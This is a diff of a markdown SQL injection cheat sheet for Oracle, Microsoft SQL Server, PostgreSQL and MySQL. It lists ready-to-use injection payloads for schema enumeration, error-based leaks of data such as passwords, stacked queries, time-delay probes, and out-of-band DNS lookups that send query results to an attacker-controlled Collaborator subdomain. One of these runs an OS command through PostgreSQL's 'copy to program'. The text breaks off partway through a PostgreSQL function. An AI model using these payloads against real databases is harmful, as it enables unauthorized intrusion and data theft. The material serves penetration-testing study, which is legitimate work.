@@ -1,5 +1,14 @@
 # sqlcheatsheet<br/>
-cheatsheet<br/>
+# Common SQLI Types:<br/>
+## 1.Inband or classical<br/>
+1a.Error based<br/>
+1b.Union based<br/>
+## 2.Blind or inferential<br/>
+2a.Boolean based<br/>
+2b.Delay or Time based<br/>
+## 3.Outofband<br/>
+
+
 # 1. In band or classic sql injection<br/>
 1. Error based 2. Union based<br/>
 **Error based**<br/>
@@ -76,9 +85,9 @@ select sleep(5)<br/>
 # cheat sheet commands <br/>
 This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.<br/>
 <br/><br/>
-String concatenation<br/>
+**String concatenation**<br/>
 You can concatenate together multiple strings to make a single string.<br/>
-<br/><br/>
+<br/>
 Oracle	'foo'||'bar'<br/>
 Microsoft	'foo'+'bar' <br/>
 PostgreSQL	'foo'||'bar'<br/>
@@ -87,18 +96,18 @@ CONCAT('foo','bar')<br/>
 
 <br/><br/>
 
-Substring<br/>
+**Substring**<br/>
 You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.<br/>
-<br/><br/>
+<br/>
 Oracle	SUBSTR('foobar', 4, 2)<br/>
 Microsoft	SUBSTRING('foobar', 4, 2)<br/>
 PostgreSQL	SUBSTRING('foobar', 4, 2)<br/>
 MySQL	SUBSTRING('foobar', 4, 2)<br/>
 
 <br/><br/>
-Comments<br/>
+**Comments**<br/>
 You can use comments to truncate a query and remove the portion of the original query that follows your input.<br/>
-<br/><br/>
+<br/>
 Oracle	--comment<br/>
 Microsoft	--comment<br/>
 /*comment*/<br/>
@@ -109,20 +118,20 @@ MySQL	#comment<br/>
 /*comment*/<br/>
 <br/><br/>
 
-Database version<br/>
+**Database version**<br/>
 You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.<br/>
-<br/><br/>
+<br/>
 Oracle	SELECT banner FROM v$version<br/>
 SELECT version FROM v$instance<br/>
 Microsoft	SELECT @@version<br/>
 PostgreSQL	SELECT version()<br/>
 MySQL	SELECT @@version<br/>
 
-<br/><br/><br/>
-
-Database contents<br/>
-You can list the tables that exist in the database, and the columns that those tables contain.<br/>
 <br/><br/>
+
+**Database contents**<br/>
+You can list the tables that exist in the database, and the columns that those tables contain.<br/>
+<br/>
 Oracle	SELECT * FROM all_tables<br/>
 SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'<br/>
 Microsoft	SELECT * FROM information_schema.tables<br/>
@@ -131,38 +140,43 @@ PostgreSQL	SELECT * FROM information_schema.tables<br/>
 SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br/>
 MySQL	SELECT * FROM information_schema.tables<br/>
 SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br/>
-Conditional errors<br/>
-You can test a single boolean condition and trigger a database error if the condition is true.<br/>
 <br/><br/>
+
+**Conditional errors**<br/>
+You can test a single boolean condition and trigger a database error if the condition is true.<br/>
+<br/>
 Oracle	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual<br/>
 Microsoft	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END<br/>
 PostgreSQL	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)<br/>
 MySQL	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')<br/>
-Extracting data via visible error messages<br/>
+<br/><br/>
+
+**Extracting data via visible error messages**<br/>
 You can potentially elicit error messages that leak sensitive data returned by your malicious query.<br/>
-<br/><br/>
+<br/>
 Microsoft	SELECT 'foo' WHERE 1 = (SELECT 'secret')<br/>
-<br/><br/>
+<br/>
 Conversion failed when converting the varchar value 'secret' to data type int.<br/>
 PostgreSQL	SELECT CAST((SELECT password FROM users LIMIT 1) AS int)<br/>
-<br/><br/>
+<br/>
  invalid input syntax for integer: "secret"<br/>
 MySQL	SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))<br/>
-<br/><br/>
+<br/>
  XPATH syntax error: '\secret'<br/>
-Batched (or stacked) queries<br/>
-You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.<br/>
+
 <br/><br/>
+**Batched (or stacked) queries**<br/>
+You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.<br/>
+<br/>
 Oracle	Does not support batched queries.<br/>
 Microsoft	QUERY-1-HERE; QUERY-2-HERE<br/>
 PostgreSQL	QUERY-1-HERE; QUERY-2-HERE<br/>
 MySQL	QUERY-1-HERE; QUERY-2-HERE<br/>
 Note<br/>
 With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.<br/>
-<br/><br/><br/>
+<br/><br/>
 
-
-Time delays<br/>
+**Time delays**<br/>
 You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.<br/>
 <br/><br/><br/>
 Oracle	dbms_pipe.receive_message(('a'),10)<br/>
@@ -170,37 +184,37 @@ Microsoft	WAITFOR DELAY '0:0:10'<br/>
 PostgreSQL	SELECT pg_sleep(10)<br/>
 MySQL	SELECT SLEEP(10)<br/>
 
-<br/><br/><br/>
-Conditional time delays<br/>
+<br/><br/>
+**Conditional time delays**<br/>
 You can test a single boolean condition and trigger a time delay if the condition is true.<br/>
-
 Oracle	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual<br/>
 Microsoft	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'<br/>
 PostgreSQL	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END<br/>
 MySQL	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')<br/>
 
-<br/><br/><br/>
-
-DNS lookup<br/>
-You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.<br/>
 <br/><br/>
+
+# 3. Out of Band
+**DNS lookup**<br/>
+You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.<br/>
+<br/>
 Oracle	<br/>
 (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br/>
-<br/><br/>
+<br/>
 SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual<br/>
 The following technique works on fully patched Oracle installations, but requires elevated privileges:<br/>
-<br/><br/>
+<br/>
 SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')<br/>
 Microsoft	exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'<br/>
 PostgreSQL	copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'<br/>
 MySQL	<br/>
 The following techniques work on Windows only:<br/>
-<br/><br/>
+<br/>
 LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')<br/>
 SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'<br/>
 DNS lookup with data exfiltration<br/>
 You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.<br/>
-<br/><br/>
+<br/>
 Oracle	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual<br/>
 Microsoft	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')<br/>
 PostgreSQL	create OR replace function f() returns void as $$<br/>
